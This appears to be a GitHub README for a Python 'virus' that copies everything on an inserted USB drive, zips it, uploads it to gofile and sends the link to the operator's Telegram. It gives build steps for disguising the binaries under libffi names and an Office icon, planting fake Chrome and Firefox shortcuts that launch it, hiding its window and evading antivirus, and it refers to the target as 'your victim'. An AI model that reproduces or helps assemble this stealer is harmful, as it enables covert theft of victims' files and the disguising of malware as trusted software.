> ## Information🔍 ##
I've created a python program consisting of three scripts to send all the data on a USB flash drive in a zip file to telegram. 

>The first script is usb.py, which will detect the insertion of a USB flash drive and send it to Windows as a zip file. Thanks to : @bestmahdi2 https://github.com/bestmahdi2/FileStealerUSB2PC/blob/master/FileStealerUSB2PC.py

>The second script will upload the zip file to gofile thanks to : @khodekhadem https://github.com/j0rd1s3rr4n0/FileUploader/tree/main/GoFIle

>And the third script will send the file link to telegram.

The virus is propagated by launching the file pyth0n.ps1 or Pyth0n.exe, which will create a shortcut on the desktop named chrome and firefox so that the virus is launched when the user clicks on it. Launching pyth0n will also move the virus to C:/windows-office. 
The principle of this virus is that it is undetectable by antivirus software and completely anonymous.




To get an .exe file instead of the used python: auto-py-to-exe https://pypi.org/project/auto-py-to-exe/

>## Build👩‍💻

To create the virus, you'll need to modify the bots and main files in python to enter your telegram connection keys. once modified, you'll compile them with auto-py-to-exe. for main.py use the office icon and for the bot files rename them with the following names: 

chrome >> libffi-26.exe  
firefox >> libffi-25.exe  
install >> libffi-13.exe

autodestroy >> libffi-14.exe

UID-generator >> libffi-64.exe

then use ps1 to exe to convert the autodestroy.ps1 file and rename it to driver.exe. your project should look like this:

in folder data :

in folder shorcut :

move libffi-64.exe to _internal

To start the infection, just run Pyth0n.exe.

> ## Bug🦠 ##

~~At the moment I can't hide the stealer window. The terminal is therefore visible. I'm working on it.~~ Fix✅

If chrome and/or firefox are not installed, the shortcut will open the virus window ad infinitum.
In this case, if you know that your victim does not have firefox or/and chrome, disable the move in pyth0n.
